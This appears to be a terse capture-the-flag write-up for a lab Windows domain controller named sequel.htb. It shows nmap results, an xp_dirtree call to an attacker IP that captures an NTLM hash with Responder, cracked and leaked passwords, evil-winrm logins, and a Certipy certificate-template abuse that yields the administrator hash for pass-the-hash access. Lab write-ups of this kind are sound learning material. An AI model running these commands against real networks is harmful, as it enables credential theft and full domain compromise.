## Enumeration

```nmap
Nmap scan report for 10.10.11.202
Host is up (0.053s latency).
Not shown: 988 filtered tcp ports (no-response)
PORT     STATE SERVICE       VERSION
53/tcp   open  domain        Simple DNS Plus
88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2023-03-08 17:58:40Z)
135/tcp  open  msrpc         Microsoft Windows RPC
139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-08T18:00:01+00:00; +7h56m43s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
445/tcp  open  microsoft-ds?
464/tcp  open  kpasswd5?
593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
636/tcp  open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-08T18:00:01+00:00; +7h56m43s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
1433/tcp open  ms-sql-s      Microsoft SQL Server 2019 15.00.2000.00; RTM
| ssl-cert: Subject: commonName=SSL_Self_Signed_Fallback
| Issuer: commonName=SSL_Self_Signed_Fallback
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2023-03-08T13:11:14
| Not valid after:  2053-03-08T13:11:14
| MD5:   f9e7884e8ff0e11683a61b080ef5d9f4
|_SHA-1: 5afc3b5299ba81f1e3b262534b45ac0e23803d06
|_ssl-date: 2023-03-08T18:00:01+00:00; +7h56m43s from scanner time.
|_ms-sql-ntlm-info: ERROR: Script execution failed (use -d to debug)
|_ms-sql-info: ERROR: Script execution failed (use -d to debug)
3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-08T18:00:01+00:00; +7h56m43s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
3269/tcp open  ssl/ldap      Microsoft Windows Active Directory LDAP (Domain: sequel.htb0., Site: Default-First-Site-Name)
|_ssl-date: 2023-03-08T18:00:01+00:00; +7h56m43s from scanner time.
| ssl-cert: Subject: commonName=dc.sequel.htb
| Subject Alternative Name: othername: 1.3.6.1.4.1.311.25.1::<unsupported>, DNS:dc.sequel.htb
| Issuer: commonName=sequel-DC-CA
| Public Key type: rsa
| Public Key bits: 2048
| Signature Algorithm: sha256WithRSAEncryption
| Not valid before: 2022-11-18T21:20:35
| Not valid after:  2023-11-18T21:20:35
| MD5:   869f7f54b2edff74708d1a6ddf34b9bd
|_SHA-1: 742ab4522191331767395039db9b3b2e27b6f7fa
Service Info: Host: DC; OS: Windows; CPE: cpe:/o:microsoft:windows

Host script results:
|_clock-skew: mean: 7h56m42s, deviation: 0s, median: 7h56m42s
| smb2-security-mode: 
|   311: 
|_    Message signing enabled and required
| smb2-time: 
|   date: 2023-03-08T17:59:24
|_  start_date: N/A


```


found on Public a .pdf with creds 


PublicUser : GuestUserCantWrite1


by this mssql client we can access trought previous creds found and that pdf... 

```
impacket-mssqlclient sequel/PublicUser:GuestUserCantWrite1@10.10.11.202 -dc-ip 10.10.11.202


```
with the help of google found a way to get ntlm hash pass with help of Responder


```xp_dirtree '\\<attacker_IP>\lol'
```
```
[+] Listening for events...

[!] Error starting TCP server on port 53, check permissions or other servers running.
[SMB] NTLMv2-SSP Client   : 10.10.11.202
[SMB] NTLMv2-SSP Username : sequel\sql_svc
[SMB] NTLMv2-SSP Hash     : sql_svc::sequel:1264f7f254ccccb1:61134A69F27AA544CCFB7D8A0C113FE9:0101000000000000002193CF367ED90199308B80564BF29B000000000200080051004A0044004F0001001E00570049004E002D003400580045005100500056003500360039003300380004003400570049004E002D00340058004500510050005600350036003900330038002E0051004A0044004F002E004C004F00430041004C000300140051004A0044004F002E004C004F00430041004C000500140051004A0044004F002E004C004F00430041004C0007000800002193CF367ED9010600040002000000080030003000000000000000000000000030000070D0A7DE86F9022DE715E151CC306D6D55442DF3479FF8FCCD1DC72FFA2D48F90A001000000000000000000000000000000000000900220063006900660073002F00310030002E00310030002E00310034002E003100300039000000000000000000

```



sql_svc : REGGIE1234ronnie	


evil-winrm -u sql_svc -i 10.10.11.202 
REGGIE1234ronnie


go to C:\SQLServer\Logs\ERRORLOG.BAK 

reveals

sequel.htb\Ryan.Cooper  : NuclearMosquito3



evil-winrm with ryan.cooper



## Privilage Escalation


winpeas sees something about certs



i saw something with certify.exe but for some reson it didn't work for me with the build in visual studio c#


so i decided to do it with Certipy Certipy is an offensive tool for enumerating and abusing Active Directory Certificate Services (AD CS




`certipy find -vulnerable -stdout -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202`

found this

-> Template Name : UserAuthentication
--> Certificate Authorities : sequel-DC-CA


```certipy req -u Ryan.Cooper@sequel.htb -p NuclearMosquito3 -dc-ip 10.10.11.202 -template UserAuthentication -ca sequel-DC-CA  -upn administrator@sequel.htb ```



this create a .pfx 


`certipy auth -pfx file.pfx -dc-ip 10.10.11.202 `

this occur an error KRB_AP_ERR_SKEW(Clock skew too great)


so i sync time with ntpdate and did it again



`[*] Got hash for 'administrator@sequel.htb': aad3b435b51404eeaad3b435b51404ee:a52f78e4c751e5f5e17e1e9f3e58f4ee
`




`evil-winrm -H a52f78e4c751e5f5e17e1e9f3e58f4ee -i 10.10.11.202 -u administrator`


6e5e6513f1704fa8a60be2c6aa0ebb78












